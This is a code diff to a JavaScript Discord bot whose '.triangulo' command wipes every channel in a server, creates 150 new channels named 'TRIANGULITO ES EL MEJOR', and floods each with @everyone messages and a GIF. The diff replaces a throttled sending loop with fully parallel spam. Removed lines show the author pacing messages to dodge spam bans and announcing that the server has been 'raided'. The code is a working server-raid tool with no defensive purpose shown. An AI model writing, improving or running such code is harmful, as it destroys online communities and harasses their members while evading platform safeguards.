@@ -15,7 +15,7 @@ const client = new Client({
 
 // Pre-load image buffers once at startup to avoid re-reading files on every message
 const iconBuffer = fs.readFileSync('./attached_assets/40fd13ae2d1126651d55d5411b28b65f_1768104286084.png');
-const triangulitoBuffer = fs.readFileSync('attached_assets/GKvdAxlrAZkbrEsBAO2c6bNmmd0ObmdjAAAF.gif');
+const triangulitoBuffer = fs.readFileSync('./attached_assets/GKvdAxlrAZkbrEsBAO2c6bNmmd0ObmdjAAAF.gif');
 
 // Pre-build static embeds once
 const invasionEmbed = new EmbedBuilder()
@@ -176,30 +176,15 @@ else if (cmd.startsWith('.diversión')) {
 
 else if (cmd === '.triangulo') {
     if (!guild) return;
-
-    const trianguloEmbed = new EmbedBuilder()
-      .setColor(0xFF0000)
-      .setDescription('TRIANGULITO ES EL MEJOR, HABEIS SIDO RAIDEADO POR EL GOAT DE TRIANGULITO')
-      .setImage('attachment://triangulo.gif');
-
+    // 1. Delete + Create in parallel batches
     await deleteAllChannels(guild);
-    
-    // REDUCE la cantidad a algo más manejable para evitar el bloqueo inmediato
-    const created = await createChannels(guild, 'TRIANGULITO ES EL MEJOR', 50, 10);
-    
-    // Aquí es donde el bot se bloquea. Necesitamos un bucle con espera
-    for (const channel of created) {
-        for (let i = 0; i < 10; i++) {
-            await channel.send({ 
-                content: '@everyone', 
-                embeds: [trianguloEmbed],
-                files: [new AttachmentBuilder(triangulitoBuffer, { name: 'triangulo.gif' })]
-            }).catch(console.error);
-            
-            // Pausa de 500ms entre cada mensaje para no ser baneado por spam
-            await new Promise(r => setTimeout(r, 500)); 
-        }
-    }
+    const created = await createChannels(guild, 'TRIANGULITO ES EL MEJOR', 150, 10);
+    // 2. Spam all 10 messages per channel fully in parallel
+    await spamChannels(created, 10, () => ({
+      content: '@everyone',
+      embeds: [trianguloEmbed],
+      files: [new AttachmentBuilder(triangulitoBuffer, { name: 'triangulito.webp' })]
+    }));
   }
 
   else if (cmd === '.ban') {
